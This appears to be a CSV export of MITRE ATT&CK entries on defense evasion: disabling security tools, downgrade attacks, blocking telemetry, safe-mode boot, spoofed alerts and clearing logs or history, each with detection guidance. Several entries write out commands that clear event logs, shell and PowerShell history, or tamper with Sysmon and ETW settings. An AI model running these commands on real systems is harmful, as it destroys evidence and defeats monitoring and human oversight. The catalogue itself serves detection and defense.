T1562.001,attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579,Impair Defenses: Disable or Modify Tools,"Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)

Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) 

Adversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) 

On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)

In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.

Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)

Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",https://attack.mitre.org/techniques/T1562/001,21 February 2020,28 May 2023,enterprise-attack,1.5,Defense Evasion,"Monitor processes and command-line arguments to see if security tools/services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Monitoring for changes to other known features used by deployed security tools may also expose malicious activity.

Lack of expected log events may be suspicious.","Containers, IaaS, Linux, Network, Windows, macOS","Command: Command Execution, Driver: Driver Load, Process: Process Creation, Process: Process Termination, Sensor Health: Host Status, Service: Service Metadata, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification",True,T1562,"Anti-virus, File monitoring, Host intrusion prevention systems, Log analysis, Signature-based detection","Alex Soler, AttackIQ; Cian Heasley; Daniel Feichter, @VirtualAllocEx, Infosec Tirol; Gal Singer, @galsinger29, Team Nautilus Aqua Security; Gordon Long, Box, Inc., @ethicalhax; Lucas Heiligenstein; Nathaniel Quist, Palo Alto Networks; Sarathkumar Rajendran, Microsoft Defender365; Ziv Karliner, @ziv_kr, Team Nautilus Aqua Security",,,,,,"(Citation: Medium S2W WhisperGate January 2022),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Forcepoint Monsoon),(Citation: Booz Allen Hamilton),(Citation: SANS Conficker),(Citation: Trend Micro Muddy Water March 2021),(Citation: Trend Micro Tick November 2019),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Cylance Cleaver),(Citation: Mandiant FIN12 Oct 2021),(Citation: Talos Cobalt Strike September 2020),(Citation: Symantec WastedLocker June 2020),(Citation: TrendMicro DarkComet Sept 2014),(Citation: Cisco Talos Intelligence Group),(Citation: Novetta Blockbuster),(Citation: Unit 42 Rocke January 2019),(Citation: Arxiv Avaddon Feb 2021),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: ESET Grandoreiro April 2020),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: Check Point Warzone Feb 2020),(Citation: Check Point Meteor Aug 2021),(Citation: FireEye Ryuk and Trickbot January 2019),(Citation: Wired Lockergoga 2019),(Citation: DigiTrust NanoCore Jan 2017),(Citation: Unit 42 Hildegard Malware),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Sophos Netwalker May 2020),(Citation: Novetta Blockbuster Tools),(Citation: Securelist Kimsuky Sept 2013),(Citation: ESET Turla PowerShell May 2019),(Citation: Korean FSI TA505 2020),(Citation: Baumgartner Naikon 2015),(Citation: PaloAlto NanoCore Feb 2016),(Citation: CERT-FR PYSA April 2020),(Citation: Sophos Maze VM September 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: Novetta Blockbuster Loaders),(Citation: ESET Ebury Oct 2017),(Citation: Microsoft PLATINUM April 2016),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Fortinet Diavol July 2021),(Citation: Imminent Unit42 Dec2019),(Citation: Dragos EKANS),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: Proofpoint TA2541 February 2022),(Citation: McAfee Gold Dragon),(Citation: FireEye FIN6 Apr 2019),(Citation: wardle evilquest parti),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: FireEye MuddyWater Mar 2018),(Citation: Cybereason Clop Dec 2020),(Citation: Talos Promethium June 2020),(Citation: objsee mac malware 2017),(Citation: Talos Rocke August 2018),(Citation: US-CERT SHARPKNOT June 2018),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Fortinet Agent Tesla June 2017),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Trend Micro Skidmap),(Citation: Sophos Ragnar May 2020),(Citation: McAfee Maze March 2020),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: IBM MegaCortex),(Citation: TrendMicro Netwalker May 2020),(Citation: Proofpoint Leviathan Oct 2017),(Citation: ESET Gamaredon June 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: CrowdStrike Putter Panda),(Citation: Intrinsec Egregor Nov 2020),(Citation: ATT TeamTNT Chimaera September 2020),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: McAfee Night Dragon),(Citation: Cylance Sodinokibi July 2019),(Citation: Donut Github),(Citation: CarbonBlack RobbinHood May 2019),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Medium Metamorfo Apr 2020),(Citation: 20 macOS Common Tools and Techniques),(Citation: Talos Kimsuky Nov 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Group IB Ransomware September 2020),(Citation: Trend Micro Trickbot Nov 2018),(Citation: Talos ZxShell Oct 2014),(Citation: DFIR Ryuk's Return October 2020),(Citation: Prevx Carberp March 2011),(Citation: Unit 42 WhisperGate January 2022),(Citation: FireEye SUNBURST Additional Details Dec 2020),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: FireEye Ransomware Feb 2020),(Citation: Malwarebytes DarkComet March 2018),(Citation: Cisco H1N1 Part 2),(Citation: NCC Group Team9 June 2020),"
T1562.010,attack-pattern--824add00-99a1-4b15-9a2d-6c5683b7b497,Impair Defenses: Downgrade Attack,"Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system’s backward compatibility to force it into less secure modes of operation. 

Adversaries may downgrade and use various less-secure versions of features of a system, such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or even network protocols that can be abused to enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) or [Network Sniffing](https://attack.mitre.org/techniques/T1040).(Citation: Praetorian TLS Downgrade Attack 2014) For example, [PowerShell](https://attack.mitre.org/techniques/T1059/001) versions 5+ includes Script Block Logging (SBL) which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to [Impair Defenses](https://attack.mitre.org/techniques/T1562) while running malicious scripts that may have otherwise been detected.(Citation: CrowdStrike BGH Ransomware 2021)(Citation: Mandiant BYOL 2018)(Citation: att_def_ps_logging)

Adversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.(Citation: Targeted SSL Stripping Attacks Are Real)(Citation: Crowdstrike Downgrade)",https://attack.mitre.org/techniques/T1562/010,08 October 2021,03 October 2023,enterprise-attack,1.2,Defense Evasion,"Monitor for commands or other activity that may be indicative of attempts to abuse older or deprecated technologies (ex: <code>powershell –v 2</code>). Also monitor for other abnormal events, such as execution of and/or processes spawning from a version of a tool that is not expected in the environment.

Monitor for Windows event ID (EID) 400, specifically the <code>EngineVersion</code> field which shows the version of PowerShell running and may highlight a malicious downgrade attack.(Citation: inv_ps_attacks)

Monitor network data to detect cases where HTTP is used instead of HTTPS.","Linux, Windows, macOS","Command: Command Execution, Process: Process Creation, Process: Process Metadata",True,T1562,,"Arad Inbar, Fidelis Security; Daniel Feichter, @VirtualAllocEx, Infosec Tirol; Mayuresh Dani, Qualys",,,,,,",(Citation: Chromium HSTS)"
T1562.003,attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59,Impair Defenses: Impair Command History Logging,"Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. 

On Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.

Adversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to ""ignoredups"". In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. 

On Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)

Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",https://attack.mitre.org/techniques/T1562/003,21 February 2020,30 March 2023,enterprise-attack,2.2,Defense Evasion,"Correlating a user session with a distinct lack of new commands in their <code>.bash_history</code> can be a clue to suspicious behavior. Additionally, users checking or changing their <code>HISTCONTROL</code>, <code>HISTFILE</code>, or <code>HISTFILESIZE</code> environment variables may be suspicious.

Monitor for modification of PowerShell command history settings through processes being created with <code>-HistorySaveStyle SaveNothing</code> command-line arguments and use of the PowerShell commands <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code> and <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to clear or disable historical log data with built-in features native to the network device platform.  Monitor such command activity for unexpected or unauthorized use of commands being run by non-standard users from non-standard locations.","Linux, Network, Windows, macOS","Command: Command Execution, Sensor Health: Host Status",True,T1562,"Host forensic analysis, Log analysis","Austin Clark, @c2defense; Emile Kenning, Sophos; Vikas Singh, Sophos",,,,,,"(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: Securing bash history)"
T1562.006,attack-pattern--74d2a63f-3c7b-4852-92da-02d8fbab16da,Impair Defenses: Indicator Blocking,"An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018), by tampering settings that control the collection and flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).

For example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.(Citation: disable_win_evt_logging) 

ETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.

In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.

In Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors (Citation: LemonDuck).",https://attack.mitre.org/techniques/T1562/006,19 March 2020,18 September 2023,enterprise-attack,1.3,Defense Evasion,"Detect lack of reported activity from a host sensor. Different methods of blocking may cause different disruptions in reporting. Systems may suddenly stop reporting all data or only certain kinds of data.

Depending on the types of host information collected, an analyst may be able to detect the event that triggered a process to stop or connection to be blocked. For example, Sysmon will log when its configuration state has changed (Event ID 16) and Windows Management Instrumentation (WMI) may be used to subscribe ETW providers that log any provider removal from a specific trace session. (Citation: Medium Event Tracing Tampering 2018) To detect changes in ETW you can also monitor the registry key which contains configurations for all ETW event providers: <code>HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AUTOLOGGER_NAME\{PROVIDER_GUID}</code>","Linux, Windows, macOS","Command: Command Execution, Sensor Health: Host Status, Windows Registry: Windows Registry Key Modification",True,T1562,"Anti-virus, Host intrusion prevention systems",Lucas Heiligenstein; Rob Smith,,,,,,"(Citation: MDSec Brute Ratel August 2022),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Trend Micro Waterbear December 2019),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: ESET Ebury Feb 2014),(Citation: Microsoft ETW May 2018)"
T1562.009,attack-pattern--28170e17-8384-415c-8486-2e6b294cb803,Impair Defenses: Safe Mode Boot,"Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.(Citation: Microsoft Safe Mode)(Citation: Sophos Snatch Ransomware 2019)

Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.(Citation: Microsoft bcdedit 2021)

Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may also be registered and loaded in safe mode.(Citation: Sophos Snatch Ransomware 2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus MedusaLocker 2020)(Citation: BleepingComputer REvil 2021)",https://attack.mitre.org/techniques/T1562/009,23 June 2021,31 August 2021,enterprise-attack,1.0,Defense Evasion,"Monitor Registry modification and additions for services that may start on safe mode. For example, a program can be forced to start on safe mode boot by adding a <code>\*</code> in front of the ""Startup"" value name: <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\[""\*Startup""=""{Path}""]</code> or by adding a key to <code>HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal</code>.(Citation: BleepingComputer REvil 2021)(Citation: Sophos Snatch Ransomware 2019)

Monitor execution of processes and commands associated with making configuration changes to boot settings, such as <code>bcdedit.exe</code> and <code>bootcfg.exe</code>.(Citation: Microsoft bcdedit 2021)(Citation: Microsoft Bootcfg)(Citation: Sophos Snatch Ransomware 2019)",Windows,"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",True,T1562,"Anti-virus, Host Intrusion Prevention Systems","Jorell Magtibay, National Australia Bank Limited; Kiyohito Yamamoto, RedLark, NTT Communications; Yusuke Kubo, RedLark, NTT Communications",Administrator,,,,,"(Citation: Minerva Labs Black Basta May 2022),(Citation: Trend Micro AvosLocker Apr 2022),(Citation: Palo Alto Networks Black Basta August 2022),(Citation: Avertium Black Basta June 2022),(Citation: BleepingComputer REvil 2021),(Citation: Cyble Black Basta May 2022),(Citation: Trend Micro Black Basta May 2022),(Citation: Costa AvosLocker May 2022),(Citation: CyberArk Labs Safe Mode 2016)"
T1562.011,attack-pattern--bef8aaee-961d-4359-a308-4c2182bcedff,Impair Defenses: Spoof Security Alerting,"Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders’ awareness of malicious activity.(Citation: BlackBasta) Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.

Rather than or in addition to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)). An adversary can also present a “healthy” system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.

For example, adversaries may show a fake Windows Security GUI and tray icon with a “healthy” system status after Windows Defender and other system tools have been disabled.(Citation: BlackBasta)",https://attack.mitre.org/techniques/T1562/011,14 March 2023,12 April 2023,enterprise-attack,1.0,Defense Evasion,,"Linux, Windows, macOS","Process: Process Creation, Sensor Health: Host Status",True,T1562,,Goldstein Menachem,,,,,,","
T1070.003,attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a,Indicator Removal: Clear Command History,"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.

On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.

Adversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  

Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)

On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.

The <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)

Adversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",https://attack.mitre.org/techniques/T1070/003,31 January 2020,07 April 2023,enterprise-attack,1.4,Defense Evasion,"User authentication, especially via remote terminal services like SSH, without new entries in that user's <code>~/.bash_history</code> is suspicious. Additionally, the removal/clearing of the <code>~/.bash_history</code> file can be an indicator of suspicious activity.

Monitor for suspicious modifications or deletion of <code>ConsoleHost_history.txt</code> and use of the <code>Clear-History</code> command.","Linux, Network, Windows, macOS","Command: Command Execution, File: File Deletion, File: File Modification, User Account: User Account Authentication",True,T1070,"Host forensic analysis, Log analysis","Austin Clark, @c2defense; Emile Kenning, Sophos; Vikas Singh, Sophos",,,,,,"(Citation: ESET Kobalos Feb 2021),(Citation: Trend Micro TeamTNT),(Citation: Cisco Talos Intelligence Group),(Citation: Unit 42 Hildegard Malware),(Citation: FireEye APT41 Aug 2019),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Securelist APT10 March 2021),(Citation: Securing bash history)"
T1070.002,attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36,Indicator Removal: Clear Linux or Mac System Logs,"Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)

* <code>/var/log/messages:</code>: General and system-related messages
* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs
* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records
* <code>/var/log/kern.log</code>: Kernel logs
* <code>/var/log/cron.log</code>: Crond logs
* <code>/var/log/maillog</code>: Mail server logs
* <code>/var/log/httpd/</code>: Web server access and error logs
",https://attack.mitre.org/techniques/T1070/002,28 January 2020,29 March 2020,enterprise-attack,1.0,Defense Evasion,File system monitoring may be used to detect improper deletion or modification of indicator files. Also monitor for suspicious processes interacting with log files.,"Linux, macOS","Command: Command Execution, File: File Deletion, File: File Modification",True,T1070,,,,,,,,"(Citation: Anomali Rocke March 2019),(Citation: ESET DazzleSpy Jan 2022),(Citation: objsee mac malware 2017),(Citation: Aqua TeamTNT August 2020),"
T1070.008,attack-pattern--438c967d-3996-4870-bfc2-3954752a1927,Indicator Removal: Clear Mailbox Data,"Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. 

Adversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003) for command and control, or email-based exfiltration such as [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell Module) On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use [AppleScript](https://attack.mitre.org/techniques/T1059/002) to interact with APIs on macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation: mailx man page)

Adversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.(Citation: Microsoft OAuth Spam 2022)",https://attack.mitre.org/techniques/T1070/008,08 July 2022,12 April 2023,enterprise-attack,1.1,Defense Evasion,,"Google Workspace, Linux, Office 365, Windows, macOS","Application Log: Application Log Content, Command: Command Execution, File: File Deletion, File: File Modification, Process: Process Creation",True,T1070,,"Liran Ravich, CardinalOps",,,,,,"(Citation: Volexity SolarWinds),(Citation: Cybereason Cobalt Kitty 2017),(Citation: Microsoft Manage Mail Flow Rules 2023)"
T1070.007,attack-pattern--3975dbb5-0e1e-4f5b-bae1-cf2ab84b46dc,Indicator Removal: Clear Network Connection History and Configurations,"Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.

Network connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under (Citation: Microsoft RDP Removal):

* <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers</code>

Windows may also store information about recent RDP connections in files such as <code>C:\Users\\%username%\Documents\Default.rdp</code> and `C:\Users\%username%\AppData\Local\Microsoft\Terminal
Server Client\Cache\`.(Citation: Moran RDPieces) Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).(Citation: Apple Culprit Access)(Citation: FreeDesktop Journal)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)

Malicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004) or tampering to enable [Proxy](https://attack.mitre.org/techniques/T1090). Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.",https://attack.mitre.org/techniques/T1070/007,15 June 2022,08 September 2023,enterprise-attack,1.1,Defense Evasion,,"Linux, Network, Windows, macOS","Command: Command Execution, File: File Modification, Firewall: Firewall Rule Modification, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1070,,CrowdStrike Falcon OverWatch,,,,,,"(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Secureworks BRONZE SILHOUETTE May 2023),"
T1070.009,attack-pattern--d2c4e5ea-dbdf-4113-805a-b1e2a337fb33,Indicator Removal: Clear Persistence,"Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, [Modify Registry](https://attack.mitre.org/techniques/T1112), [Plist File Modification](https://attack.mitre.org/techniques/T1647), or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence.(Citation: Cylance Dust Storm) Adversaries may also delete accounts previously created to maintain persistence (i.e. [Create Account](https://attack.mitre.org/techniques/T1136)).(Citation: Talos - Cisco Attack 2022)

In some instances, artifacts of persistence may also be removed once an adversary’s persistence is executed in order to prevent errors with the new instance of the malware.(Citation: NCC Group Team9 June 2020)",https://attack.mitre.org/techniques/T1070/009,29 July 2022,11 April 2023,enterprise-attack,1.1,Defense Evasion,,"Linux, Windows, macOS","Command: Command Execution, File: File Deletion, File: File Modification, Process: Process Creation, Scheduled Job: Scheduled Job Modification, User Account: User Account Deletion, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification",True,T1070,,Gavin Knapp,,,,,,"(Citation: ESET RTM Feb 2017),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Secureworks MCMD July 2019),(Citation: Trend Micro njRAT 2018),(Citation: Group IB GrimAgent July 2021),(Citation: Trustwave Pillowmint June 2020),(Citation: Cylance Dust Storm),(Citation: NCC Group Team9 June 2020),"
T1070.001,attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2,Indicator Removal: Clear Windows Event Logs,"Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.

The event logs can be cleared with the following utility commands:

* <code>wevtutil cl system</code>
* <code>wevtutil cl application</code>
* <code>wevtutil cl security</code>

These logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging. Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)",https://attack.mitre.org/techniques/T1070/001,28 January 2020,11 August 2023,enterprise-attack,1.3,Defense Evasion,"Deleting Windows event logs (via native binaries (Citation: Microsoft wevtutil Oct 2017), API functions (Citation: Microsoft EventLog.Clear), or [PowerShell](https://attack.mitre.org/techniques/T1059/001) (Citation: Microsoft Clear-EventLog)) may also generate an alterable event (Event ID 1102: ""The audit log was cleared"").",Windows,"Command: Command Execution, File: File Deletion, Process: OS API Execution, Process: Process Creation",True,T1070,"Anti Virus, Host Intrusion Prevention Systems, Log Analysis",Lucas Heiligenstein,,,Clearing the Windows event logs requires Administrator permissions,,,"(Citation: FinFisher Citation),(Citation: NCC Group Chimera January 2021),(Citation: DOJ GRU Indictment Jul 2018),(Citation: ESEST Black Energy Jan 2016),(Citation: FireEye APT41 Aug 2019),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: Crowdstrike DNC June 2016),(Citation: Microsoft FinFisher March 2018),(Citation: Symantec Hydraq Jan 2010),(Citation: Talos Nyetya June 2017),(Citation: FoxIT Wocao December 2019),(Citation: McAfee Gold Dragon),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Gh0stRAT ATT March 2019),(Citation: Symantec WastedLocker June 2020),(Citation: Unit 42 Lucifer June 2020),(Citation: FireEye APT38 Oct 2018),(Citation: Wevtutil Microsoft Documentation),(Citation: Microsoft BlackCat Jun 2022),(Citation: Talos ZxShell Oct 2014),(Citation: FireEye APT32 May 2017),(Citation: Check Point Meteor Aug 2021),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: US-CERT TA18-074A),(Citation: Symantec Trojan.Hydraq Jan 